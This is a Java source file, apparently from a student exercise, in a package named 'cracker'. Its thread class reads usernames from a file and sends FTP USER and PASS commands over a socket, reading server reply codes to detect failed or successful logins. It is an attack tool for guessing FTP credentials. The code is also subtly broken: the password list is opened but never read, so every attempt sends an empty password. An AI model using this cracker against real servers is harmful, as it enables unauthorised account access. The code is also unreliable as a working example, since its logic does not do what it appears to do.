/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package cracker;

import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.LinkedList;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author dam2
 */
public class Escribir extends Thread {

    Socket socket;
    LinkedList<String> mensajes;
    boolean cierre = false;
    String mensaje = "";
    
    int id = 0;
    Escribir() {

    }

    Escribir(Socket socket, LinkedList<String> mensajes) {
        this.socket = socket;
        this.mensajes = mensajes;
    }

    public void run(){
        String respuesta = "";
        String user = "";
        String pass = "";
        try{
        Scanner sc = new Scanner(new File("usuarios.txt"));
        Scanner sc2 = new Scanner(new File("claves.txt"));
        while(sc.hasNext()){
                user = sc.nextLine();            
        
        while (!cierre) {
            
            try {

                while (mensajes.size() > 0) {
                    respuesta = mensajes.pop();
                    System.out.println(respuesta);
                }

                PrintWriter escribir = new PrintWriter(socket.getOutputStream());

                if (mensajes.size() <= 0) {
                    escribir.println("user " + user);
                    System.out.println("usuario " + user);
                    escribir.flush();
                    
                    System.out.println(mensajes);

                    Thread.sleep(5);
                    System.out.println("despues sleep " + id + " " + mensajes);
                    
                    mensaje = mensajes.pop();
                    if (mensaje.contains("331")) {
                        System.out.println("Hola22");
                        System.out.println("usuario 2" + user);
                        escribir.println("pass " + pass);
                        escribir.flush();

                    }

                    while (mensajes.isEmpty()) {
                        Thread.sleep(250);
                    }

                    mensaje = mensajes.pop();
                    System.out.println("prueba " + id + " "+ mensaje);
                    if (mensaje.contains("530")) {
                        System.out.println("entro 530 " + id );
                        cierre = true;
                        socket.close();
                    } else if (mensaje.contains("230")) {
                        //br.write("usuario: " + usuario + " contrasenia: " + contrasenia + "\n");
                        //bw.flush();
                    }
                }
            } catch (IOException ex) {
                Logger.getLogger(Escribir.class.getName()).log(Level.SEVERE, null, ex);
            } catch (InterruptedException ex) {
                Logger.getLogger(Escribir.class.getName()).log(Level.SEVERE, null, ex);
            }
        id++;
        }
        }
        }catch(Exception e){
                e.getStackTrace();
        }

    }
}
